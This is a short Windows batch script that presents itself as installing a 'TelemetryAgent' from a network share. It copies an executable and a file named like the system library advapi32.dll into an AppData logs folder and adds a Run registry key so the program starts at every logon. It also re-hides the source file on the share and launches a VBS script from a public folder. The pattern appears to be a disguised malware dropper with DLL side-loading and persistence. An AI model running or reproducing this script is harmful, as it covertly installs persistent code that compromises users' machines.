@echo off
attrib -h "\\192.0.2.55\distribution\TelemetryAgent.exe"
copy /y "\\192.0.2.55\distribution\TelemetryAgent.exe" "%APPDATA%\Acme\logs\TelemetryAgent.exe"
copy /y "\\192.0.2.55\distribution\advapi32.dll" "%APPDATA%\Acme\logs\advapi32.dll"
REG.EXE ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v TelemetryAgent /t REG_SZ /d "%APPDATA%\Acme\logs\TelemetryAgent.exe" /f
ATTRIB.EXE "\\192.0.2.55\distribution\TelemetryAgent.exe" +a +h
WScript.exe "C:\Users\Public\prncnfg.vbs"
